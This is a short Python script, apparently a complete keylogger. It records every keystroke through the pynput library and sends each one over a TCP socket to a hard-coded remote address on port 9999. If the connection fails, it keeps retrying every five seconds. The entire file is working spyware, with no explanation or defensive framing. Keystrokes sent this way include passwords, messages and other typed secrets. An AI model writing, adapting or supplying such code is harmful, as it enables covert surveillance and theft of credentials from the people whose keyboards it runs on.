import socket
import time
import threading
from pynput import keyboard

# Server Configuration
server_ip = "172.17.3.130"  # Replace with the actual server IP address
server_port = 9999

# Create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Function to send data to the server
def send_data(data):
    try:
        client.sendall(data.encode('utf-8'))
    except socket.error as e:
        print(f"Error sending data: {e}")

# Function to handle keyboard events
def on_press(key):
    try:
        send_data(f"{key.char}")
    except AttributeError:
        send_data(f"{key}")

# Attempt to connect to the server
while True:
    try:
        client.connect((server_ip, server_port))
        print(f"Connected to server at {server_ip}:{server_port}")
        break
    except socket.error as e:
        print(f"Connection failed: {e}. Retrying in 5 seconds...")
        time.sleep(5)  # Wait for 5 seconds before retrying

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# Close the connection
client.close()